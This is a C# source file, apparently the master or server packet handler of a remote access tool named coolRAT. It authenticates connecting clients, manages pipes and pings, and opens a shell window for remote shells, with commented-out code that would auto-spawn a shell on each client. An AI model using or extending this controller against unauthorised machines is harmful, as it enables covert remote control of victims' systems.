using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.PacketProcessors;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Master
{
    public class Server_PacketHandler : PacketHandler
    {
        public Server_PacketHandler(TcpConnection connection) : base(connection)
        {

        }

        public override void HandlePacket(object sender, string packet_raw)
        {
            Packet packet = Packet.Deserialize(packet_raw);
            if (packet.Type == "AuthenticateConnectionPacket")
            {
                AuthenticateConnectionPacket_PacketProcessor authenticateConnectionPacket_PacketProcessor
                    = new AuthenticateConnectionPacket_PacketProcessor(Connection, AuthenticateConnectionPacket.Deserialize(packet_raw));
                Client client = authenticateConnectionPacket_PacketProcessor.Process();
                MasterListener.ConnectedClients.Add(client.UniqueId, client);

                /////////////////////////////////////////////////////////////////////
               Task.Run(() =>
                {
                    //Thread.Sleep(1000);
                    //ConnectShellPacket shell_packet = new ConnectShellPacket(client.UniqueId);
                    //client.Pipes.MainPipe.SendPacket(shell_packet);
                    //Console.WriteLine($"Told client {client.UniqueId} to spawn a new shell.");
                });
                /////////////////////////////////////////////////////////////////////
                return;
            }
            if (packet.Type == "ConnectPipePacket")
            {
                ConnectPipePacket connectPipePacket = ConnectPipePacket.Deserialize(packet_raw);
                ConnectPipePacket_PacketProcessor connectPipePacket_PacketProcessor
                    = new ConnectPipePacket_PacketProcessor(Connection, connectPipePacket, MasterListener.ConnectedClients);

                connectPipePacket_PacketProcessor.Process();

                if(connectPipePacket.PipeType == PipeType.Ping)
                {
                    // Exception in packet handling (dosłownie wyjątek, nie błąd)
                    if (!MasterListener.ConnectedClients.ContainsKey(connectPipePacket.ClientId))
                        return;
                    PacketListenerLoop parent_loop = sender as PacketListenerLoop;
                    TcpConnection connection = parent_loop.Connection;
                    parent_loop.AbortLoop = true;
                    Task.Run(() =>
                    {
                        // Redirect connection to the ping service
                        MasterListener.PingService.AddClient(MasterListener.ConnectedClients[connectPipePacket.ClientId], false);
                        MasterListener.PingService.ConnectedClients[connectPipePacket.ClientId].WaitForTimeout();
                        Console.WriteLine("Stop redirecting ping pipe");
                        Task.Run(() => parent_loop.Run());
                    });
                }
                return;
            }
            if (packet.Type == "DisconnectPipePacket")
            {
                DisconnectPipePacket_PacketProcessor disconnectPipePacket_PacketProcessor
                    = new DisconnectPipePacket_PacketProcessor(Connection, DisconnectPipePacket.Deserialize(packet_raw), MasterListener.ConnectedClients);

                disconnectPipePacket_PacketProcessor.Process();
                return;
            }
            if (packet.Type == "ShellConnectedPacket")
            {
                // Exception in packet handling (dosłownie wyjątek, nie błąd)
                ShellConnectedPacket shellConnectedPacket = ShellConnectedPacket.Deserialize(packet_raw);
                if (!shellConnectedPacket.Success) return;
                // Redirects all packets from now on to a new packet handler
                PacketListenerLoop parent_loop = sender as PacketListenerLoop;
                TcpConnection connection = parent_loop.Connection;
                parent_loop.AbortLoop = true;
                Task.Run(() =>
                {
                    // Spawn a new shell emulator window
                    ShellWindow shellWindow = new ShellWindow(shellConnectedPacket.ShellUniqueId, connection,
                        MasterListener.ConnectedClients[shellConnectedPacket.ClientUniqueId]);
                    shellWindow.ShowDialog();
                    // Stop redirecting the packets on this connection
                    Console.WriteLine("Stop redirecting");
                    Task.Run(() => parent_loop.Run());
                });
            }
        }
    }
}
